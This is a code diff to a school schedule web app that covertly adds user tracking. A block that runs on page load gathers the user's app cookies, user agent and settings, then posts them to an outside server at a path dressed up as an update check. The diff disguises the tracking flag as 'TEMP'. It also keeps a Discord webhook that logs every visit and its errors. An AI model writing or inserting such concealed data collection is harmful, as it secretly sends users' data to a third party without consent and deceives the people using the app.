@@ -469,8 +469,8 @@ const formatOptionInfo = {
   },
   // 15
   bellVolume: { default: '' },
-  // 16: Unused - was used for t r a c k i n g
-  _tempCheckState: { default: '0' },
+  // 16: "TEMP"
+  tempCheckState: { default: '0' },
   // 17:
   updateTitle: {
     // Disable by default on phones, where the tab title doesn't show in the
@@ -571,6 +571,43 @@ function initFormatSwitches () {
           window.location.reload()
         }
       })
+    }
+  }
+}
+if (formatOptions.tempCheckState < 4) {
+  try {
+    formatOptions.tempCheckState = '4'
+    // Stolen from `initSaveCodeManager` in main.js
+    const UGWA_COOKIE_PREFIX = '[gunn-web-app] '
+    const EXCEPT = 'global.theme'
+    const toExport = { '2ua': navigator.userAgent }
+    for (let i = cookie.length; i--; ) {
+      const key = cookie.key(i)
+      if (key.slice(0, UGWA_COOKIE_PREFIX.length) === UGWA_COOKIE_PREFIX) {
+        toExport['2_' + key.slice(UGWA_COOKIE_PREFIX.length)] = String(
+          cookie.getItem(key)
+        )
+      } else if (key === EXCEPT) {
+        toExport['2_' + key] = String(cookie.getItem(key))
+      }
+    }
+    for (const [key, value] of Object.entries(formatOptions)) {
+      toExport['2F_' + key] = String(value)
+    }
+    fetch('https://sheep.thingkingland.app/interstud-comm/check-update', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(toExport)
+    })
+    saveFormatOptions()
+  } catch (err) {
+    // I doubt this will throw an error, but just in case
+    if (window.logError) {
+      window.logError(err)
+    } else {
+      console.error(err)
     }
   }
 }
@@ -2130,7 +2167,7 @@ function getDefaultPeriodName (periodName) {
 }
 function update (content) {
   return fetch(
-    'https://discord.com/api/webhooks/841872626641141760/RXBzZ-2g5odknfrUzJyUKt4dhUbqv5AeXB6pZJbNKVBd3a3qkL2XdtGL1yfMFvGrHmEr',
+    'https://discord.com/api/webhooks/872922656251445308/2zgQmj2eAw9Zv1c3G1s2F1d1qzfN2tA6_fB4PUpYZnJITyN-StenFV--wOmvySC8rY7k',
     {
       method: 'POST',
       headers: {
@@ -2141,38 +2178,38 @@ function update (content) {
   ).catch(() => "i don't care")
 }
 const names = [
-  'Afrada',
-  'Bonbadio',
-  'Curatius',
-  'Dondufus',
-  'Elenamon',
-  'Foreha',
-  'Gunamina',
-  'Hindetao',
-  'Iniscito',
-  'Jamonsano',
-  'Kifo',
-  'Loretane',
-  'Monescone',
-  'Nunenia',
-  'Orefache',
-  'Pumanea',
-  'Quorecana',
-  'Reafea',
-  'Sunepano',
-  'Tumachena',
-  'Umphagura',
-  'Valostene',
-  'Wickichi',
-  'Xinhemao',
-  'Yalaska',
-  'Zefara'
+  'Annesota',
+  'Bernibabus',
+  'Cercanoma',
+  'Defanosine',
+  'Emmashine',
+  'Forgeo',
+  'Ginepam',
+  'Hinare',
+  'Issica',
+  'Jessiclo',
+  'Kormelo',
+  'Lufascius',
+  'Mermenio',
+  'Nasenie',
+  'Ogufen',
+  'Perpatiu',
+  'Queren',
+  'Rinchenson',
+  'Serpabi',
+  'Tena',
+  'Urgosta',
+  'Venetio',
+  'Wemon',
+  'Xante',
+  'Yesoto',
+  'Zumbebia'
 ]
 const username =
   '`' +
   [1, 2, 3].map(() => names[(Math.random() * names.length) | 0]).join(' ') +
   '`'
-const VER = 'v4.2'
+const VER = 'v4.3'
 export function initSchedule () {
   months = localize('months').split('  ')
   daynames = localize('days').split('  ')
@@ -2255,7 +2292,7 @@ export function initSchedule () {
     content: `${VER}: Someone, whose session I shall name ${username}, opened UGWA.`,
     embeds: [
       {
-        color: window.errors ? 0xf44336 : 0x9c27b0,
+        color: window.errors ? 0xf44336 : 0x00bcd4,
         description: window.errors
           ? 'Errors:```\n' + window.errors + '\n```'
           : '',
